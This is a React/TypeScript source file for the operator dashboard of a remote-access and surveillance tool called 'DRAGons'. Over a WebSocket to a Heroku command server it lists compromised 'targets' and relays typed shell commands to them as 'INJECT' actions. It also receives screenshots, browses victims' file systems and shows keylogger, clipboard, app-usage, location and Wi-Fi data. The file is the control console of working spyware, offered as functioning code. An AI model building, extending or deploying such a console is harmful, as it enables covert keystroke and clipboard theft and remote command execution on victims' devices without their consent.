import React, { Component, Fragment } from "react";

import Clock from "./components/Clock";
import Text from "./components/Text";

import * as styles from "./App.styles";
import NetworkStatus from "./ui/general/NetworkStatus";
import { Action } from "./models/action";
import { Target } from "./models/target";
import DeviceView from "./ui/target/DeviceView";
import LocationView from "./ui/target/LocationView";
import NetworkView from "./ui/target/NetworkView";
import WifiView from "./ui/target/WifiView";
import ExplorerView from "./ui/target/ExplorerView";
import TargetListView from "./ui/general/TargetListView";
import Terminal from "./ui/general/Terminal";
import { StdoutLine } from "./models/stdoutLine";
import LoggerView from "./ui/target/LoggerView";
import { base64ToBytes, downloadBytes } from "./services/encoding";
import FileExplorer from "./ui/target/FileExplorer";

const localeOptions = {
  year: "numeric",
  month: "numeric",
  day: "numeric",
  hour: "numeric",
  minute: "numeric"
};

class AppState {
  online: boolean = false;
  target?: Target;
  targets: string[] = [];
  stdout: StdoutLine[] = [];
  img: string = "";
}

class App extends Component<{}, AppState> {
  static url = "ws://dragons-land.herokuapp.com/ws";

  private websocket: WebSocket;
  private terminalInput = React.createRef<HTMLInputElement>();

  state = new AppState();

  constructor(props: any) {
    super(props);
    this.websocket = new WebSocket(App.url);
    this.initConnection();

    window.addEventListener("keydown", (ev: KeyboardEvent) => {
      if (ev.ctrlKey && ev.shiftKey && ev.key === "P") {
        ev.preventDefault();
      }
    });
  }

  initConnection() {
    this.websocket.removeEventListener("open", this.onOpen);
    this.websocket.removeEventListener("close", this.onClose);
    this.websocket.removeEventListener("message", this.onMessage);
    this.websocket = new WebSocket(App.url);
    this.websocket.addEventListener("open", this.onOpen);
    this.websocket.addEventListener("close", this.onClose);
    this.websocket.addEventListener("message", this.onMessage);
  }

  onOpen = () => {
    this.setState({ online: true });
    this.send({ type: "CONNECT_CLIENT" });
  };

  onClose = () => {
    this.setState(new AppState());
  };

  onMessage = (ev: MessageEvent) => {
    const data = JSON.parse(ev.data);
    const { type, payload } = data;
    console.log(data);
    if (type === "DATA") {
      const { targets }: { targets: string[] } = payload;
      this.setState({ targets });
      const { target } = this.state;
      if (target && targets.indexOf(target.key) === -1)
        this.setState({ target: undefined });
    } else if (type === "TARGET_CONNECTED") {
      this.setState({
        target: {...payload, key: data.key},
      });
    } else if (type === "STDOUT") {
      const { error, stdout } = payload;
      this.setState(
        {
          stdout: [
            ...this.state.stdout,
            ...stdout.split("\n").map((value: string) => ({ error, value }))
          ]
        },
        () => {
          this.terminalInput.current!.scrollIntoView();
        }
      );
    } else if (type == "LOG") {
      console.log(payload);
      let { target } = this.state;
      if (target) {
        const keylog: string[] = "keylog" in target ? target.keylog : [];
        target.keylog = [...keylog, ...payload.keylog];
        const applog: string[] = "applog" in target ? target.applog : [];
        target.applog = [...applog, ...payload.applog];
        const clipboardLog: string[] =
          "clipboardLog" in target ? target.clipboardLog : [];
        target.clipboardLog = [...clipboardLog, ...payload.clipboardLog];
        this.setState({
          target: target
        });
      }
    } else if (type == "SCREENSHOT") {
      this.setState({img: payload});
      const bytes = base64ToBytes(payload);
      // downloadBytes(
      //   [bytes],
      //   `${new Date().toLocaleString("en-GB", localeOptions)}.jpg`
      // );
    } else if (type == "GET_DIRECTORY") {   
      const { target } = this.state;
      if (target && payload) {
        this.setState({ target: {...target, directoryInfo: payload} });
      }
    } else {
      console.log(data);
    }
  };

  send = (obj: Action) => {
    console.log(obj);
    this.websocket.send(JSON.stringify(obj));
  }

  sendToTarget = (action: Action, target?: string) => {
    if (!target && this.state.target) target = this.state.target!.key;

    return this.send({
      ...action,
      to: target
    });
  };

  get targetConnected(): boolean {
    return !!this.state.target;
  }

  selectTarget = (target: string) => {
    if (!this.state.target || this.state.target.key !== target) {
      this.send({
        type: "CONNECT_TO_TARGET",
        payload: target
      });
    }
  };

  executeCommand = (input: string) => {
    const parts = input.split(" ");
    const action = parts[0];
    let rest = parts.slice(1, parts.length);

    if (action === "clear") {
      this.setState({ stdout: [] });
    } else {
      console.log("sending");

      this.sendToTarget({
        type: "INJECT",
        payload: input
      });
    }
  };

  clear = (key: string) => () => {
    const { target } = this.state;
    if (target) {
      if (key === "keylog") target.keylog = [];
      if (key === "applog") target.applog = [];
      if (key === "clipboardLog") target.clipboardLog = [];
      this.setState({ target });
    }
  };

  handleContextMenu = (key: string, action: string) => {
    this.sendToTarget({ type: action.replace(" ", "_") }, key);
  };

  navigateDirectory = (path: string) => {
    console.log(path);
    
    this.sendToTarget({type: "GET_DIRECTORY", payload: path});
  }

  render() {
    const { online, target, targets, img } = this.state;

    let right = <div />;
    let bottom = <div />;

    if (target) {
      right = (
        <div className={styles.right}>
          <DeviceView target={target} />
          <NetworkView target={target} />
          {"location" in target && Object.keys(target.location!).length > 0 && (
            <LocationView target={target} />
          )}
          <WifiView target={target} />
          <ExplorerView target={target} />
        </div>
      );
      bottom = (
        <Fragment>
          {"keylog" in target && (
            <LoggerView
              title="KEY LOGGER"
              style={{ gridArea: "keylogger" }}
              log={target.keylog}
              onClear={this.clear("keylog")}
            />
          )}
          {"applog" in target && (
            <LoggerView
              title="APP LOGGER"
              style={{ gridArea: "applogger" }}
              log={target.applog}
              onClear={this.clear("applog")}
            />
          )}
          {"clipboardLog" in target && (
            <LoggerView
              title="CLIPBOARD"
              style={{ gridArea: "clipboardlogger" }}
              log={target.clipboardLog}
              onClear={this.clear("clipboardLog")}
            />
          )}
          {"directoryInfo" in target && (
            <FileExplorer onNavigate={this.navigateDirectory} directory={target.directoryInfo!} />
          )}
        </Fragment>
      );
    }

    return (
      <div className={styles.grid}>
        <div className={styles.top}>
          <Text font="Major Mono Display" weight={500} size="18px">
            DRAGons
          </Text>
        </div>
        <div className={styles.main}>
          <Terminal
            inputRef={this.terminalInput}
            onEnter={this.executeCommand}
            stdout={this.state.stdout}
          />
        </div>
        <div className={styles.left}>
          <Clock />
          <NetworkStatus
            online={online}
            targetConnected={this.targetConnected}
          />
          <TargetListView
            onMenu={this.handleContextMenu}
            targets={targets}
            target={target}
            onSelect={this.selectTarget}
          />
           <img width={200} src={`data:image/png;base64, ${img}`} alt="Red dot" />
        </div>
        {right}
        <div className={styles.bottom}>{bottom}</div>
      </div>
    );
  }
}

export default App;
